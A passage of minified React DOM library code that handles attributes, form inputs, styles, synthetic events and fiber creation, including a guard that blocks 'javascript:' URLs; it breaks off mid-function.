Mt=RegExp(`^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$`),Nt={},Pt={};function Ft(e){return Oe.call(Pt,e)?!0:Oe.call(Nt,e)?!1:Mt.test(e)?Pt[e]=!0:(Nt[e]=!0,!1)}function It(e,t,n){if(Ft(t))if(n===null)e.removeAttribute(t);else{switch(typeof n){case`undefined`:case`function`:case`symbol`:e.removeAttribute(t);return;case`boolean`:var r=t.toLowerCase().slice(0,5);if(r!==`data-`&&r!==`aria-`){e.removeAttribute(t);return}}e.setAttribute(t,``+n)}}function Lt(e,t,n){if(n===null)e.removeAttribute(t);else{switch(typeof n){case`undefined`:case`function`:case`symbol`:case`boolean`:e.removeAttribute(t);return}e.setAttribute(t,``+n)}}function Rt(e,t,n,r){if(r===null)e.removeAttribute(n);else{switch(typeof r){case`undefined`:case`function`:case`symbol`:case`boolean`:e.removeAttribute(n);return}e.setAttributeNS(t,n,``+r)}}function zt(e){switch(typeof e){case`bigint`:case`boolean`:case`number`:case`string`:case`undefined`:return e;case`object`:return e;default:return``}}function Bt(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()===`input`&&(t===`checkbox`||t===`radio`)}function Vt(e,t,n){var r=Object.getOwnPropertyDescriptor(e.constructor.prototype,t);if(!e.hasOwnProperty(t)&&r!==void 0&&typeof r.get==`function`&&typeof r.set==`function`){var i=r.get,a=r.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return i.call(this)},set:function(e){n=``+e,a.call(this,e)}}),Object.defineProperty(e,t,{enumerable:r.enumerable}),{getValue:function(){return n},setValue:function(e){n=``+e},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function Ht(e){if(!e._valueTracker){var t=Bt(e)?`checked`:`value`;e._valueTracker=Vt(e,t,``+e[t])}}function Ut(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),r=``;return e&&(r=Bt(e)?e.checked?`true`:`false`:e.value),e=r,e===n?!1:(t.setValue(e),!0)}function Wt(e){if(e||=typeof document<`u`?document:void 0,e===void 0)return null;try{return e.activeElement||e.body}catch{return e.body}}var Gt=/[\n"\\]/g;function Kt(e){return e.replace(Gt,function(e){return`\\`+e.charCodeAt(0).toString(16)+` `})}function qt(e,t,n,r,i,a,o,s){e.name=``,o!=null&&typeof o!=`function`&&typeof o!=`symbol`&&typeof o!=`boolean`?e.type=o:e.removeAttribute(`type`),t==null?o!==`submit`&&o!==`reset`||e.removeAttribute(`value`):o===`number`?(t===0&&e.value===``||e.value!=t)&&(e.value=``+zt(t)):e.value!==``+zt(t)&&(e.value=``+zt(t)),t==null?n==null?r!=null&&e.removeAttribute(`value`):Yt(e,o,zt(n)):Yt(e,o,zt(t)),i==null&&a!=null&&(e.defaultChecked=!!a),i!=null&&(e.checked=i&&typeof i!=`function`&&typeof i!=`symbol`),s!=null&&typeof s!=`function`&&typeof s!=`symbol`&&typeof s!=`boolean`?e.name=``+zt(s):e.removeAttribute(`name`)}function Jt(e,t,n,r,i,a,o,s){if(a!=null&&typeof a!=`function`&&typeof a!=`symbol`&&typeof a!=`boolean`&&(e.type=a),t!=null||n!=null){if(!(a!==`submit`&&a!==`reset`||t!=null)){Ht(e);return}n=n==null?``:``+zt(n),t=t==null?n:``+zt(t),s||t===e.value||(e.value=t),e.defaultValue=t}r??=i,r=typeof r!=`function`&&typeof r!=`symbol`&&!!r,e.checked=s?e.checked:!!r,e.defaultChecked=!!r,o!=null&&typeof o!=`function`&&typeof o!=`symbol`&&typeof o!=`boolean`&&(e.name=o),Ht(e)}function Yt(e,t,n){t===`number`&&Wt(e.ownerDocument)===e||e.defaultValue===``+n||(e.defaultValue=``+n)}function Xt(e,t,n,r){if(e=e.options,t){t={};for(var i=0;i<n.length;i++)t[`$`+n[i]]=!0;for(n=0;n<e.length;n++)i=t.hasOwnProperty(`$`+e[n].value),e[n].selected!==i&&(e[n].selected=i),i&&r&&(e[n].defaultSelected=!0)}else{for(n=``+zt(n),t=null,i=0;i<e.length;i++){if(e[i].value===n){e[i].selected=!0,r&&(e[i].defaultSelected=!0);return}t!==null||e[i].disabled||(t=e[i])}t!==null&&(t.selected=!0)}}function Zt(e,t,n){if(t!=null&&(t=``+zt(t),t!==e.value&&(e.value=t),n==null)){e.defaultValue!==t&&(e.defaultValue=t);return}e.defaultValue=n==null?``:``+zt(n)}function Qt(e,t,n,r){if(t==null){if(r!=null){if(n!=null)throw Error(i(92));if(oe(r)){if(1<r.length)throw Error(i(93));r=r[0]}n=r}n??=``,t=n}n=zt(t),e.defaultValue=n,r=e.textContent,r===n&&r!==``&&r!==null&&(e.value=r),Ht(e)}function $t(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&n.nodeType===3){n.nodeValue=t;return}}e.textContent=t}var en=new Set(`animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp`.split(` `));function tn(e,t,n){var r=t.indexOf(`--`)===0;n==null||typeof n==`boolean`||n===``?r?e.setProperty(t,``):t===`float`?e.cssFloat=``:e[t]=``:r?e.setProperty(t,n):typeof n!=`number`||n===0||en.has(t)?t===`float`?e.cssFloat=n:e[t]=(``+n).trim():e[t]=n+`px`}function nn(e,t,n){if(t!=null&&typeof t!=`object`)throw Error(i(62));if(e=e.style,n!=null){for(var r in n)!n.hasOwnProperty(r)||t!=null&&t.hasOwnProperty(r)||(r.indexOf(`--`)===0?e.setProperty(r,``):r===`float`?e.cssFloat=``:e[r]=``);for(var a in t)r=t[a],t.hasOwnProperty(a)&&n[a]!==r&&tn(e,a,r)}else for(var o in t)t.hasOwnProperty(o)&&tn(e,o,t[o])}function rn(e){if(e.indexOf(`-`)===-1)return!1;switch(e){case`annotation-xml`:case`color-profile`:case`font-face`:case`font-face-src`:case`font-face-uri`:case`font-face-format`:case`font-face-name`:case`missing-glyph`:return!1;default:return!0}}var an=new Map([[`acceptCharset`,`accept-charset`],[`htmlFor`,`for`],[`httpEquiv`,`http-equiv`],[`crossOrigin`,`crossorigin`],[`accentHeight`,`accent-height`],[`alignmentBaseline`,`alignment-baseline`],[`arabicForm`,`arabic-form`],[`baselineShift`,`baseline-shift`],[`capHeight`,`cap-height`],[`clipPath`,`clip-path`],[`clipRule`,`clip-rule`],[`colorInterpolation`,`color-interpolation`],[`colorInterpolationFilters`,`color-interpolation-filters`],[`colorProfile`,`color-profile`],[`colorRendering`,`color-rendering`],[`dominantBaseline`,`dominant-baseline`],[`enableBackground`,`enable-background`],[`fillOpacity`,`fill-opacity`],[`fillRule`,`fill-rule`],[`floodColor`,`flood-color`],[`floodOpacity`,`flood-opacity`],[`fontFamily`,`font-family`],[`fontSize`,`font-size`],[`fontSizeAdjust`,`font-size-adjust`],[`fontStretch`,`font-stretch`],[`fontStyle`,`font-style`],[`fontVariant`,`font-variant`],[`fontWeight`,`font-weight`],[`glyphName`,`glyph-name`],[`glyphOrientationHorizontal`,`glyph-orientation-horizontal`],[`glyphOrientationVertical`,`glyph-orientation-vertical`],[`horizAdvX`,`horiz-adv-x`],[`horizOriginX`,`horiz-origin-x`],[`imageRendering`,`image-rendering`],[`letterSpacing`,`letter-spacing`],[`lightingColor`,`lighting-color`],[`markerEnd`,`marker-end`],[`markerMid`,`marker-mid`],[`markerStart`,`marker-start`],[`overlinePosition`,`overline-position`],[`overlineThickness`,`overline-thickness`],[`paintOrder`,`paint-order`],[`panose-1`,`panose-1`],[`pointerEvents`,`pointer-events`],[`renderingIntent`,`rendering-intent`],[`shapeRendering`,`shape-rendering`],[`stopColor`,`stop-color`],[`stopOpacity`,`stop-opacity`],[`strikethroughPosition`,`strikethrough-position`],[`strikethroughThickness`,`strikethrough-thickness`],[`strokeDasharray`,`stroke-dasharray`],[`strokeDashoffset`,`stroke-dashoffset`],[`strokeLinecap`,`stroke-linecap`],[`strokeLinejoin`,`stroke-linejoin`],[`strokeMiterlimit`,`stroke-miterlimit`],[`strokeOpacity`,`stroke-opacity`],[`strokeWidth`,`stroke-width`],[`textAnchor`,`text-anchor`],[`textDecoration`,`text-decoration`],[`textRendering`,`text-rendering`],[`transformOrigin`,`transform-origin`],[`underlinePosition`,`underline-position`],[`underlineThickness`,`underline-thickness`],[`unicodeBidi`,`unicode-bidi`],[`unicodeRange`,`unicode-range`],[`unitsPerEm`,`units-per-em`],[`vAlphabetic`,`v-alphabetic`],[`vHanging`,`v-hanging`],[`vIdeographic`,`v-ideographic`],[`vMathematical`,`v-mathematical`],[`vectorEffect`,`vector-effect`],[`vertAdvY`,`vert-adv-y`],[`vertOriginX`,`vert-origin-x`],[`vertOriginY`,`vert-origin-y`],[`wordSpacing`,`word-spacing`],[`writingMode`,`writing-mode`],[`xmlnsXlink`,`xmlns:xlink`],[`xHeight`,`x-height`]]),on=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function sn(e){return on.test(``+e)?`javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')`:e}function cn(){}var ln=null;function un(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var dn=null,fn=null;function pn(e){var t=wt(e);if(t&&(e=t.stateNode)){var n=e[ht]||null;a:switch(e=t.stateNode,t.type){case`input`:if(qt(e,n.value,n.defaultValue,n.defaultValue,n.checked,n.defaultChecked,n.type,n.name),t=n.name,n.type===`radio`&&t!=null){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll(`input[name="`+Kt(``+t)+`"][type="radio"]`),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var a=r[ht]||null;if(!a)throw Error(i(90));qt(r,a.value,a.defaultValue,a.defaultValue,a.checked,a.defaultChecked,a.type,a.name)}}for(t=0;t<n.length;t++)r=n[t],r.form===e.form&&Ut(r)}break a;case`textarea`:Zt(e,n.value,n.defaultValue);break a;case`select`:t=n.value,t!=null&&Xt(e,!!n.multiple,t,!1)}}}var mn=!1;function hn(e,t,n){if(mn)return e(t,n);mn=!0;try{return e(t)}finally{if(mn=!1,(dn!==null||fn!==null)&&(Du(),dn&&(t=dn,e=fn,fn=dn=null,pn(t),e)))for(t=0;t<e.length;t++)pn(e[t])}}function gn(e,t){var n=e.stateNode;if(n===null)return null;var r=n[ht]||null;if(r===null)return null;n=r[t];a:switch(t){case`onClick`:case`onClickCapture`:case`onDoubleClick`:case`onDoubleClickCapture`:case`onMouseDown`:case`onMouseDownCapture`:case`onMouseMove`:case`onMouseMoveCapture`:case`onMouseUp`:case`onMouseUpCapture`:case`onMouseEnter`:(r=!r.disabled)||(e=e.type,r=!(e===`button`||e===`input`||e===`select`||e===`textarea`)),e=!r;break a;default:e=!1}if(e)return null;if(n&&typeof n!=`function`)throw Error(i(231,t,typeof n));return n}var _n=!(typeof window>`u`||window.document===void 0||window.document.createElement===void 0),vn=!1;if(_n)try{var yn={};Object.defineProperty(yn,`passive`,{get:function(){vn=!0}}),window.addEventListener(`test`,yn,yn),window.removeEventListener(`test`,yn,yn)}catch{vn=!1}var bn=null,xn=null,Sn=null;function Cn(){if(Sn)return Sn;var e,t=xn,n=t.length,r,i=`value`in bn?bn.value:bn.textContent,a=i.length;for(e=0;e<n&&t[e]===i[e];e++);var o=n-e;for(r=1;r<=o&&t[n-r]===i[a-r];r++);return Sn=i.slice(e,1<r?1-r:void 0)}function wn(e){var t=e.keyCode;return`charCode`in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function Tn(){return!0}function En(){return!1}function Dn(e){function t(t,n,r,i,a){for(var o in this._reactName=t,this._targetInst=r,this.type=n,this.nativeEvent=i,this.target=a,this.currentTarget=null,e)e.hasOwnProperty(o)&&(t=e[o],this[o]=t?t(i):i[o]);return this.isDefaultPrevented=(i.defaultPrevented==null?!1===i.returnValue:i.defaultPrevented)?Tn:En,this.isPropagationStopped=En,this}return f(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var e=this.nativeEvent;e&&(e.preventDefault?e.preventDefault():typeof e.returnValue!=`unknown`&&(e.returnValue=!1),this.isDefaultPrevented=Tn)},stopPropagation:function(){var e=this.nativeEvent;e&&(e.stopPropagation?e.stopPropagation():typeof e.cancelBubble!=`unknown`&&(e.cancelBubble=!0),this.isPropagationStopped=Tn)},persist:function(){},isPersistent:Tn}),t}var On={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},kn=Dn(On),An=f({},On,{view:0,detail:0}),jn=Dn(An),Mn,Nn,Pn,Fn=f({},An,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Kn,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return`movementX`in e?e.movementX:(e!==Pn&&(Pn&&e.type===`mousemove`?(Mn=e.screenX-Pn.screenX,Nn=e.screenY-Pn.screenY):Nn=Mn=0,Pn=e),Mn)},movementY:function(e){return`movementY`in e?e.movementY:Nn}}),In=Dn(Fn),Ln=Dn(f({},Fn,{dataTransfer:0})),Rn=Dn(f({},An,{relatedTarget:0})),zn=Dn(f({},On,{animationName:0,elapsedTime:0,pseudoElement:0})),Bn=Dn(f({},On,{clipboardData:function(e){return`clipboardData`in e?e.clipboardData:window.clipboardData}})),Vn=Dn(f({},On,{data:0})),Hn={Esc:`Escape`,Spacebar:` `,Left:`ArrowLeft`,Up:`ArrowUp`,Right:`ArrowRight`,Down:`ArrowDown`,Del:`Delete`,Win:`OS`,Menu:`ContextMenu`,Apps:`ContextMenu`,Scroll:`ScrollLock`,MozPrintableKey:`Unidentified`},Un={8:`Backspace`,9:`Tab`,12:`Clear`,13:`Enter`,16:`Shift`,17:`Control`,18:`Alt`,19:`Pause`,20:`CapsLock`,27:`Escape`,32:` `,33:`PageUp`,34:`PageDown`,35:`End`,36:`Home`,37:`ArrowLeft`,38:`ArrowUp`,39:`ArrowRight`,40:`ArrowDown`,45:`Insert`,46:`Delete`,112:`F1`,113:`F2`,114:`F3`,115:`F4`,116:`F5`,117:`F6`,118:`F7`,119:`F8`,120:`F9`,121:`F10`,122:`F11`,123:`F12`,144:`NumLock`,145:`ScrollLock`,224:`Meta`},Wn={Alt:`altKey`,Control:`ctrlKey`,Meta:`metaKey`,Shift:`shiftKey`};function Gn(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=Wn[e])?!!t[e]:!1}function Kn(){return Gn}var qn=Dn(f({},An,{key:function(e){if(e.key){var t=Hn[e.key]||e.key;if(t!==`Unidentified`)return t}return e.type===`keypress`?(e=wn(e),e===13?`Enter`:String.fromCharCode(e)):e.type===`keydown`||e.type===`keyup`?Un[e.keyCode]||`Unidentified`:``},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Kn,charCode:function(e){return e.type===`keypress`?wn(e):0},keyCode:function(e){return e.type===`keydown`||e.type===`keyup`?e.keyCode:0},which:function(e){return e.type===`keypress`?wn(e):e.type===`keydown`||e.type===`keyup`?e.keyCode:0}})),Jn=Dn(f({},Fn,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0})),Yn=Dn(f({},An,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Kn})),Xn=Dn(f({},On,{propertyName:0,elapsedTime:0,pseudoElement:0})),Zn=Dn(f({},Fn,{deltaX:function(e){return`deltaX`in e?e.deltaX:`wheelDeltaX`in e?-e.wheelDeltaX:0},deltaY:function(e){return`deltaY`in e?e.deltaY:`wheelDeltaY`in e?-e.wheelDeltaY:`wheelDelta`in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0})),Qn=Dn(f({},On,{newState:0,oldState:0})),$n=[9,13,27,32],er=_n&&`CompositionEvent`in window,tr=null;_n&&`documentMode`in document&&(tr=document.documentMode);var nr=_n&&`TextEvent`in window&&!tr,rr=_n&&(!er||tr&&8<tr&&11>=tr),ir=` `,ar=!1;function or(e,t){switch(e){case`keyup`:return $n.indexOf(t.keyCode)!==-1;case`keydown`:return t.keyCode!==229;case`keypress`:case`mousedown`:case`focusout`:return!0;default:return!1}}function sr(e){return e=e.detail,typeof e==`object`&&`data`in e?e.data:null}var cr=!1;function lr(e,t){switch(e){case`compositionend`:return sr(t);case`keypress`:return t.which===32?(ar=!0,ir):null;case`textInput`:return e=t.data,e===ir&&ar?null:e;default:return null}}function ur(e,t){if(cr)return e===`compositionend`||!er&&or(e,t)?(e=Cn(),Sn=xn=bn=null,cr=!1,e):null;switch(e){case`paste`:return null;case`keypress`:if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case`compositionend`:return rr&&t.locale!==`ko`?null:t.data;default:return null}}var dr={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function fr(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t===`input`?!!dr[e.type]:t===`textarea`}function pr(e,t,n,r){dn?fn?fn.push(r):fn=[r]:dn=r,t=Md(t,`onChange`),0<t.length&&(n=new kn(`onChange`,`change`,null,n,r),e.push({event:n,listeners:t}))}var mr=null,hr=null;function gr(e){Td(e,0)}function _r(e){if(Ut(Tt(e)))return e}function vr(e,t){if(e===`change`)return t}var yr=!1;if(_n){var br;if(_n){var xr=`oninput`in document;if(!xr){var Sr=document.createElement(`div`);Sr.setAttribute(`oninput`,`return;`),xr=typeof Sr.oninput==`function`}br=xr}else br=!1;yr=br&&(!document.documentMode||9<document.documentMode)}function Cr(){mr&&(mr.detachEvent(`onpropertychange`,wr),hr=mr=null)}function wr(e){if(e.propertyName===`value`&&_r(hr)){var t=[];pr(t,hr,e,un(e)),hn(gr,t)}}function Tr(e,t,n){e===`focusin`?(Cr(),mr=t,hr=n,mr.attachEvent(`onpropertychange`,wr)):e===`focusout`&&Cr()}function Er(e){if(e===`selectionchange`||e===`keyup`||e===`keydown`)return _r(hr)}function Dr(e,t){if(e===`click`)return _r(t)}function Or(e,t){if(e===`input`||e===`change`)return _r(t)}function kr(e,t){return e===t&&(e!==0||1/e==1/t)||e!==e&&t!==t}var Ar=typeof Object.is==`function`?Object.is:kr;function jr(e,t){if(Ar(e,t))return!0;if(typeof e!=`object`||!e||typeof t!=`object`||!t)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var i=n[r];if(!Oe.call(t,i)||!Ar(e[i],t[i]))return!1}return!0}function Mr(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Nr(e,t){var n=Mr(e);e=0;for(var r;n;){if(n.nodeType===3){if(r=e+n.textContent.length,e<=t&&r>=t)return{node:n,offset:t-e};e=r}a:{for(;n;){if(n.nextSibling){n=n.nextSibling;break a}n=n.parentNode}n=void 0}n=Mr(n)}}function Pr(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?Pr(e,t.parentNode):`contains`in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function Fr(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=Wt(e.document);t instanceof e.HTMLIFrameElement;){try{var n=typeof t.contentWindow.location.href==`string`}catch{n=!1}if(n)e=t.contentWindow;else break;t=Wt(e.document)}return t}function Ir(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t===`input`&&(e.type===`text`||e.type===`search`||e.type===`tel`||e.type===`url`||e.type===`password`)||t===`textarea`||e.contentEditable===`true`)}var Lr=_n&&`documentMode`in document&&11>=document.documentMode,Rr=null,j=null,zr=null,Br=!1;function Vr(e,t,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Br||Rr==null||Rr!==Wt(r)||(r=Rr,`selectionStart`in r&&Ir(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),zr&&jr(zr,r)||(zr=r,r=Md(j,`onSelect`),0<r.length&&(t=new kn(`onSelect`,`select`,null,t,n),e.push({event:t,listeners:r}),t.target=Rr)))}function Hr(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n[`Webkit`+e]=`webkit`+t,n[`Moz`+e]=`moz`+t,n}var Ur={animationend:Hr(`Animation`,`AnimationEnd`),animationiteration:Hr(`Animation`,`AnimationIteration`),animationstart:Hr(`Animation`,`AnimationStart`),transitionrun:Hr(`Transition`,`TransitionRun`),transitionstart:Hr(`Transition`,`TransitionStart`),transitioncancel:Hr(`Transition`,`TransitionCancel`),transitionend:Hr(`Transition`,`TransitionEnd`)},Wr={},Gr={};_n&&(Gr=document.createElement(`div`).style,`AnimationEvent`in window||(delete Ur.animationend.animation,delete Ur.animationiteration.animation,delete Ur.animationstart.animation),`TransitionEvent`in window||delete Ur.transitionend.transition);function Kr(e){if(Wr[e])return Wr[e];if(!Ur[e])return e;var t=Ur[e],n;for(n in t)if(t.hasOwnProperty(n)&&n in Gr)return Wr[e]=t[n];return e}var qr=Kr(`animationend`),Jr=Kr(`animationiteration`),Yr=Kr(`animationstart`),Xr=Kr(`transitionrun`),Zr=Kr(`transitionstart`),Qr=Kr(`transitioncancel`),$r=Kr(`transitionend`),ei=new Map,ti=`abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel`.split(` `);ti.push(`scrollEnd`);function ni(e,t){ei.set(e,t),At(t,[e])}var ri=typeof reportError==`function`?reportError:function(e){if(typeof window==`object`&&typeof window.ErrorEvent==`function`){var t=new window.ErrorEvent(`error`,{bubbles:!0,cancelable:!0,message:typeof e==`object`&&e&&typeof e.message==`string`?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process==`object`&&typeof process.emit==`function`){process.emit(`uncaughtException`,e);return}console.error(e)},ii=[],ai=0,oi=0;function si(){for(var e=ai,t=oi=ai=0;t<e;){var n=ii[t];ii[t++]=null;var r=ii[t];ii[t++]=null;var i=ii[t];ii[t++]=null;var a=ii[t];if(ii[t++]=null,r!==null&&i!==null){var o=r.pending;o===null?i.next=i:(i.next=o.next,o.next=i),r.pending=i}a!==0&&di(n,i,a)}}function ci(e,t,n,r){ii[ai++]=e,ii[ai++]=t,ii[ai++]=n,ii[ai++]=r,oi|=r,e.lanes|=r,e=e.alternate,e!==null&&(e.lanes|=r)}function li(e,t,n,r){return ci(e,t,n,r),fi(e)}function ui(e,t){return ci(e,null,null,t),fi(e)}function di(e,t,n){e.lanes|=n;var r=e.alternate;r!==null&&(r.lanes|=n);for(var i=!1,a=e.return;a!==null;)a.childLanes|=n,r=a.alternate,r!==null&&(r.childLanes|=n),a.tag===22&&(e=a.stateNode,e===null||e._visibility&1||(i=!0)),e=a,a=a.return;return e.tag===3?(a=e.stateNode,i&&t!==null&&(i=31-Ge(n),e=a.hiddenUpdates,r=e[i],r===null?e[i]=[t]:r.push(t),t.lane=n|536870912),a):null}function fi(e){if(50<vu)throw vu=0,yu=null,Error(i(185));for(var t=e.return;t!==null;)e=t,t=e.return;return e.tag===3?e.stateNode:null}var pi={};function mi(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function M(e,t,n,r){return new mi(e,t,n,r)}function hi(e){return e=e.prototype,!(!e||!e.isReactComponent)}function gi(e,t){var n=e.alternate;return n===null?(n=M(e.tag,t,e.key,e.mode),n.elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=e.flags&65011712,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n.refCleanup=e.refCleanup,n}function _i(e,t){e.flags&=65011714;var n=e.alternate;return n===null?(e.childLanes=0,e.lanes=t,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=n.childLanes,e.lanes=n.lanes,e.child=n.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=n.memoizedProps,e.memoizedState=n.memoizedState,e.updateQueue=n.updateQueue,e.type=n.type,t=n.dependencies,e.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),e}function vi(e,t,n,r,a,o){var s=0;if(r=e,typeof e==`function`)hi(e)&&(s=1);else if(typeof e==`string`)s=Yf(e,n,pe.current)?26:e===`html`||e===`head`||e===`body`?27:5;else a:switch(e){case O:return e=M(31,n,t,a),e.elementType=O,e.lanes=o,e;case y:return yi(n.children,a,o,t);case b:s=8,a|=24;break;case x:return e=M(12,n,t,a|2),e.elementType=x,e.lanes=o,e;case T:return e=M(13,n,t,a),e.elementType=T,e.lanes=o,e;case E:return e=M(19,n,t,a),e.elementType=E,e.lanes=o,e;default:if(typeof e==`object`&&e)switch(e.$$typeof){case C:s=10;break a;case S:s=9;break a;case w:s=11;break a;case ee:s=14;break a;case D:s=16,r=null;break a}s=29,n=Error(i(130,e===null?`null`:typeof e,``)),r=null}return t=M(s,n,t,a),t.elementType=e,t.type=r,t.lanes=o,t}function yi(e,t,n,r){return e=M(7,e,r,t),e.lanes=n,e}function bi(e,t,n){return e=M(6,e,null,t),e.lanes=n,e}function xi(e){var t=M(18,null,null,0);return t.stateNode=e,t}function Si(e,t,n){return t=M(4,e.children===null?[]:e.children,e.key,t),t.lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}var Ci=new WeakMap;function wi(e,t){if(typeof e==`object`&&e){var n=Ci.get(e);return n===void 0?(t={value:e,source:t,stack:De(t)},Ci.set(e,t),t):n}return{value:e,source:t,stack:De(t)}}var Ti=[],Ei=0,Di=null,Oi=0,ki=[],Ai=0,ji=null,Mi=1,Ni=``;function Pi(e,t){Ti[Ei++]=Oi,Ti[Ei++]=Di,Di=e,Oi=t}function Fi(e,t,n){ki[Ai++]=Mi,ki[Ai++]=Ni,ki[Ai++]=ji,ji=e;var r=Mi;e=Ni;var i=32-Ge(r)-1;r&=~(1<<i),n+=1;var a=32-Ge(t)+i;if(30<a){var o=i-i%5;a=(r&(1<<o)-1).toString(32),r>>=o,i-=o,Mi=1<<32-Ge(t)+i|n<<i|r,Ni=a+e}else Mi=1<<a|n<<i|r,Ni=e}function Ii(e){e.return!==null&&(Pi(e,1),Fi(e,1,0))}function Li(e){for(;e===Di;)Di=Ti[--Ei],Ti[Ei]=null,Oi=Ti[--Ei],Ti[Ei]=null;for(;e===ji;)ji=ki[--Ai],ki[Ai]=null,Ni=ki[--Ai],ki[Ai]=null,Mi=ki[--Ai],ki[Ai]=null}function 